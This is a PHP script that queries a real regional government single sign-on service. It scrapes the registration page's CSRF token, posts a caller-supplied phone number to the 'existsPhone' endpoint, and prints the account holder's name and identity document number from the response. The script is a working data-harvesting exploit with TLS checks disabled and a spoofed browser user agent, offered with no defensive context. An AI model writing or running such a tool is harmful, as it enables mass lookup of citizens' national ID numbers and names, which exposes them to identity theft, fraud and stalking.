<?php
error_reporting(0);
ini_set('display_errors', 0);

$targetUrl = 'https://sso.ahzwfw.gov.cn/uccp-user/resources/appSystem/register/person-register.html?type=app&appType=iflytek_mmp_wst&appCode=169b0a30316148faa629c2366fdd63ea&source=&wstftAreaCode=340000000000&isBack=isBack';
$postUrl = 'https://sso.ahzwfw.gov.cn/uccp-user/appSystemBusiness/existsPhone';

$cookieFile = tempnam(sys_get_temp_dir(), 'cookie');

$ch = curl_init($targetUrl);
curl_setopt_array($ch, [
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_SSL_VERIFYHOST => false,
    CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    CURLOPT_COOKIEJAR => $cookieFile,
    CURLOPT_COOKIEFILE => $cookieFile,
]);
$html = curl_exec($ch);

if(curl_errno($ch)){
    echo 'Failed_to_obtain_csrf_token:'.curl_error($ch);
    exit;
}

preg_match('/var csrf_token = "(.*?)";/', $html, $matches);
if(empty($matches[1])){
    echo 'Csrf_token_not_found';
    exit;
}
$csrfToken = $matches[1];

if(empty($_GET['phone'])){
    echo 'Phone_number_is_required';
    exit;
}
$phoneNo = trim($_GET['phone']);

$postData = http_build_query([
    'phoneNo' => $phoneNo,
    'csrf_token' => $csrfToken
]);

$ch = curl_init($postUrl);
curl_setopt_array($ch, [
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $postData,
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_SSL_VERIFYHOST => false,
    CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    CURLOPT_COOKIEJAR => $cookieFile,
    CURLOPT_COOKIEFILE => $cookieFile,
    CURLOPT_HTTPHEADER => [
        'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
        'Referer: '.$targetUrl
    ]
]);
$response = curl_exec($ch);

if(curl_errno($ch)){
    echo 'Query_failed:'.curl_error($ch);
    exit;
}

$result = json_decode($response, true);
if(json_last_error() !== JSON_ERROR_NONE){
    echo 'Failed_to_parse_JSON:'.json_last_error_msg();
    exit;
}

if(empty($result['data']) || !is_array($result['data'])){
    echo 'Response_data_format_error';
    exit;
}

echo $result['data']['name'].' '.$result['data']['credentNo'];

unlink($cookieFile);
?>